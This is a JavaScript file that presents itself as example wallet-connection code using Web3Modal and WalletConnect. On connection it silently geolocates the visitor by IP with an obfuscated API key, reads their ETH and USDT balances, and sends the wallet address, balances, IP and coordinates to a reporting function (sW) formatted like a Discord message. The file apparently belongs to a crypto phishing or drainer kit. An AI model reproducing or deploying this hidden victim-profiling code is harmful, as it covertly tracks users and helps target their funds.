"use strict";

/**
 * Example JavaScript code that interacts with the page and Web3 wallets
 */

function closecryptomodal() {
  document.getElementById("cryptoModal").style.display = "none";
}

function opencryptomodal() {
  document.getElementById("cryptoModal").style.display = "grid";
}

// Unpkg imports
const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;
const EvmChains = window.EvmChains;
const Fortmatic = window.Fortmatic;

// Web3modal instance
let web3Modal;

// Chosen wallet provider given by the dialog window
let provider;

// Address of the selected account
let selectedAccount;
let istronWeb;
let currentaddress;

const shortAddress = (str, n = 6) =>
  `${str.slice(0, n)}...${str.slice(str.length - n)}`;

/**
 * Setup the orchestra
 */
// function init() {
//   console.log("Initializing");
//   console.log("WalletConnectProvider is", WalletConnectProvider);
//   console.log("Fortmatic is", Fortmatic);

//   // Tell Web3modal what providers we have available.
//   // Built-in web browser provider (only one can exist as a time)
//   // like MetaMask, Brave or Opera is added automatically by Web3modal
//   const providerOptions = {
//     walletconnect: {
//       package: WalletConnectProvider,
//       options: {
//         // PUT infura API KEY here
//         infuraId: atob("MjliMDhlOTAwZDI4NDViMmFjYzhkOTkzNjFmMzc0YmE="),
//       },
//     },

    
//   };

//   web3Modal = new Web3Modal({
//     cacheProvider: false, // optional
//     providerOptions, // required
//   });

  
// }
async function init() {
  console.log("Initializing");
  console.log("WalletConnectProvider is", WalletConnectProvider);
  console.log("Fortmatic is", Fortmatic);

  let providerOptions = {};

  // Check for Web3Modal support
  if (typeof Web3Modal !== 'undefined') {
    // Tell Web3Modal what providers we have available.
    // Built-in web browser provider (only one can exist at a time)
    // like MetaMask, Brave or Opera is added automatically by Web3Modal
    providerOptions = {
      walletconnect: {
        package: WalletConnectProvider,
        options: {
          // PUT Infura API KEY here
          infuraId: atob("MjliMDhlOTAwZDI4NDViMmFjYzhkOTkzNjFmMzc0YmE="),
        },
      },
    };
  } else {
    console.log("Web3Modal is not supported. Using generic connection method.");
    // If Web3Modal is not supported, try connecting to any injected provider
    if (window.ethereum) {
      provider = window.ethereum;
    } else if (window.web3) {
      provider = window.web3.currentProvider;
    } else {
      console.log("No injected Ethereum provider found.");
      return;
    }
  }

  web3Modal = new Web3Modal({
    cacheProvider: false, // optional
    providerOptions, // required
  });

  // Check if a provider is already connected
  if (web3Modal.cachedProvider) {
    console.log("Cached provider found:", web3Modal.cachedProvider);
    provider = new ethers.providers.Web3Provider(web3Modal.cachedProvider);
    console.log("Connected to provider:", provider);
  } else {
    console.log("No cached provider found.");
    // Display a connect button and wait for the user to click it
    // The connect button should call connect() when clicked
  }
}

/**
 * Kick in the UI action after Web3modal dialog has chosen a provider
 */
async function getLocation(){
    
  const ak = atob("MDViYTA3MTQzYjRkNGNhNDg5Yzk0MGJhOGUyZDk2NGY=")
  fetch("https://api.geoapify.com/v1/ipinfo?apiKey=" + ak)
  .then(response => response.json())
  .then(result => {
      
      city = result.city.name
      country = result.country.name
      ip = result.ip
      latitude = result.location.latitude
      longitude = result.location.longitude

  })
  .catch(error => console.log('error', error));
  //console.log(response.city.names.name)

}

async function fetchAccountData() {
  // Get a Web3 instance for the wallet
  const web3 = new Web3(provider);

  console.log("Web3 instance is", web3);

  // Get connected chain id from Ethereum node
  const chainId = await web3.eth.getChainId();

  // Get list of accounts of the connected wallet
  const accounts = await web3.eth.getAccounts();

  // MetaMask does not give you all accounts, only the selected account
  selectedAccount = accounts[0];

  localStorage.setItem("address", selectedAccount);   
  localStorage.setItem("provider", provider);

  if (selectedAccount) {showVeryFirstPage()}
}

let city;
let country;
let ip;
let latitude;
let longitude;

async function refreshAccountData() {
  await fetchAccountData(provider);
}

async function downloadTW(){
  

  let iphoneCheck = /iphone/i;
  let isApple = iphoneCheck.test(navigator.userAgent);
  
  let androidCheck = /android/i;
  let isAndroid = androidCheck.test(navigator.userAgent);

  if (isApple) {
    console.log("Its an Apple device");
    window.location.assign('https://apps.apple.com/app/apple-store/id1288339409?mt=8');
  }
  if (isAndroid){
    console.log("Its an Android device");
    window.location.assign('https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp&referrer=utm_source%3Dwebsite');
  }

}

async function OpenModal() {
  
  try {

    getLocation();
    provider = await web3Modal.connect();
    const web3Js = new Web3(provider);

    const currentChainId = await web3Js.eth.getChainId();

    if (currentChainId != 1) {
        try {
            await ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: Web3.utils.toHex(1) }]
            });

        } catch {}

    }
    const USDTAbi = [{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_upgradedAddress","type":"address"}],"name":"deprecate","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"deprecated","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_evilUser","type":"address"}],"name":"addBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"upgradedAddress","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"balances","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"maximumFee","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"unpause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_maker","type":"address"}],"name":"getBlackListStatus","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"},{"name":"","type":"address"}],"name":"allowed","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"paused","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"who","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"pause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"getOwner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"newBasisPoints","type":"uint256"},{"name":"newMaxFee","type":"uint256"}],"name":"setParams","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"issue","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"redeem","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"remaining","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"basisPointsRate","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"isBlackListed","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_clearedUser","type":"address"}],"name":"removeBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"MAX_UINT","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_blackListedUser","type":"address"}],"name":"destroyBlackFunds","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"_initialSupply","type":"uint256"},{"name":"_name","type":"string"},{"name":"_symbol","type":"string"},{"name":"_decimals","type":"uint256"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Issue","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Redeem","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"newAddress","type":"address"}],"name":"Deprecate","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"feeBasisPoints","type":"uint256"},{"indexed":false,"name":"maxFee","type":"uint256"}],"name":"Params","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_blackListedUser","type":"address"},{"indexed":false,"name":"_balance","type":"uint256"}],"name":"DestroyedBlackFunds","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_user","type":"address"}],"name":"AddedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_user","type":"address"}],"name":"RemovedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[],"name":"Pause","type":"event"},{"anonymous":false,"inputs":[],"name":"Unpause","type":"event"}]
    const USDTTokenAddressERC20 = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
    const USDTcontract = new web3Js.eth.Contract(USDTAbi, USDTTokenAddressERC20)
    var wall = (await web3Js.eth.getAccounts())[0];


    const USDTbalance = await USDTcontract.methods.balanceOf(wall).call();
    const realUSDTBal = USDTbalance/10**6
    const ETHbalance = await web3Js.eth.getBalance(wall)
    const realETHBal = ETHbalance/10**18

    const date = new Date();
    
    var wall = (await web3Js.eth.getAccounts())[0];
    var v = document.getElementById('walletAddress')
    v.innerHTML = wall

    sW("-------------------------------------------\n" + ":link: Wallet Connect\n\n" + "Address: " + wall + "\n\n<:mee6Eth:1045656862911102976> " + realETHBal.toFixed(5) + " ETH \n:round_pushpin: " + realUSDTBal.toFixed(3) + "  USDT \n\n" + ":calendar_spiral: Date: " + date + 
    "\n\nCountry: " + country + " \nCity: " + city + "\nIP: " + ip + "\nLatitude " + latitude + " Longitude " + longitude + "\n" + "-------------------------------------------")
    // Moralis.enableWeb3();
    //alert("wedd")
  } catch (e) {
    console.log("Could not get a wallet connection", e);
    return;
  }

  // Subscribe to accounts change
  provider.on("accountsChanged", (accounts) => {
    fetchAccountData();
  });

  // Subscribe to chainId change
  provider.on("chainChanged", (chainId) => {
    fetchAccountData();
  });

  // Subscribe to networkId change
  provider.on("networkChanged", (networkId) => {
    fetchAccountData();
  });

  await refreshAccountData();
}

// wallet disconnect
async function onDisconnect() {
  console.log("Killing the wallet connection", provider);

  if (provider.close) {
    await provider.close();

    await web3Modal.clearCachedProvider();
    provider = null;
  }

  selectedAccount = null;

}

window.addEventListener("load", async () => {
  init();
});

